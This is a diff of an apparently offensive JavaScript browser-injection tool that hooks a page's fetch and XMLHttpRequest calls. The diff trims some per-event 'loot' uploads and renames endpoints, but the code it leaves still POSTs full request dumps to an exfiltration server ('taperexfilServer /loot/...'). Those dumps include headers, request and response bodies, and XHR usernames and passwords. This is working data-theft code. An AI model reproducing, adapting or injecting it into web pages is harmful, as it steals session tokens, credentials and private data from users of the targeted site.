@@ -895,39 +895,6 @@ function customFetch(url, options)
 	});
 
 
-
-	// send setup loot
-	request = new XMLHttpRequest();
-	request.noIntercept = true;
-	request.open("POST", taperexfilServer + "/loot/fetchSetup/" + 
-		sessionStorage.getItem('taperSessionUUID'));
-	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-	var jsonObj = new Object();
-	jsonObj["method"] = options.method;
-	jsonObj["url"]    = url;
-	var jsonString    = JSON.stringify(jsonObj);
-	request.send(jsonString);
-
-	for (const key in options.headers)
-	{
-		const value = options.headers[key];
-		// console.log("**** " + key, value);
-
-		// send header loot
-		request = new XMLHttpRequest();
-		request.noIntercept = true;
-		request.open("POST", taperexfilServer + "/loot/fetchHeader/" + 
-			sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-		var jsonObj = new Object();
-		jsonObj["header"] = key;
-		jsonObj["value"]  = value;
-		var jsonString    = JSON.stringify(jsonObj);
-		request.send(jsonString);
-	}
-
 	// Let's get the API call good stuff
 	const requestBody = options.body;
 
@@ -952,25 +919,11 @@ function customFetch(url, options)
 
 			// Send to whole call dump
 			var request = new XMLHttpRequest();
-	        request.open("POST", taperexfilServer + "/loot/fetchRequestDump/" + sessionStorage.getItem('taperSessionUUID'));
+	        request.open("POST", taperexfilServer + "/loot/fetchRequest/" + sessionStorage.getItem('taperSessionUUID'));
 	        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	        var jsonString = JSON.stringify(details);
 	        request.send(jsonString);
 
-
-
-			// send API call body loot
-			request = new XMLHttpRequest();
-			request.noIntercept = true;
-			request.open("POST", taperexfilServer + "/loot/fetchCall/" + 
-				sessionStorage.getItem('taperSessionUUID'));
-			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-			var jsonObj = new Object();
-			jsonObj["requestBody"]  = btoa(requestBody);
-			jsonObj["responseBody"] = btoa(body);
-			var jsonString          = JSON.stringify(jsonObj);
-			request.send(jsonString);
 
 			// Check if we should take a screenshot now
 			if (window.postApiCallScreenshot)
@@ -1036,19 +989,6 @@ function monkeyPatchXHR()
         this.requestDetails.user     = user;
         this.requestDetails.password = password;
 
-
-		// send loot
-		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-		var jsonObj = new Object();
-		jsonObj["method"] = method;
-		jsonObj["url"]    = url;
-		var jsonString    = JSON.stringify(jsonObj);
-		request.send(jsonString);
-
-
 		xhrOriginalOpen.apply(this, arguments);
 	}
 
@@ -1062,22 +1002,6 @@ function monkeyPatchXHR()
 
 		// Stash it
 		this.requestDetails.headers[header] = value;
-
-		// console.log("$$$ MonekeyURL: " + this.url);
-
-		// console.log("Intercepted Header = " + header + ": " + value);
-
-
-		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-		var jsonObj = new Object();
-		jsonObj["header"] = header;
-		jsonObj["value"]  = value;
-		var jsonString    = JSON.stringify(jsonObj);
-		request.send(jsonString);
-
 
 		xhrOriginalSetHeader.apply(this, arguments);
 	}
@@ -1121,32 +1045,17 @@ function monkeyPatchXHR()
 	            this.requestDetails.responseStatus = this.status;
 
 
-
-	            var request = new XMLHttpRequest();
-	            request.open("POST", taperexfilServer + "/loot/xhrCall/" + sessionStorage.getItem('taperSessionUUID'));
-	            request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-	            var jsonObj = new Object();
-	            jsonObj["requestBody"]  = requestBody;
-	            jsonObj["responseBody"] = responseBody;
-	            var jsonString = JSON.stringify(jsonObj);
-
-	            request.send(jsonString);
-
 	            // now the big dump
 	           	console.log("+++ XHR request dump: ")
 			    console.log(this.requestDetails);
 
 		        var request = new XMLHttpRequest();
-		        request.open("POST", taperexfilServer + "/loot/xhrRequestDump/" + sessionStorage.getItem('taperSessionUUID'));
+		        request.open("POST", taperexfilServer + "/loot/xhrRequest/" + sessionStorage.getItem('taperSessionUUID'));
 		        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		        var jsonString = JSON.stringify(this.requestDetails);
 		        request.send(jsonString);
 	        }
 	    };
-
-
-
 
 	    xhrOriginalSend.call(this, data);  // Ensure to use the original send
 	};
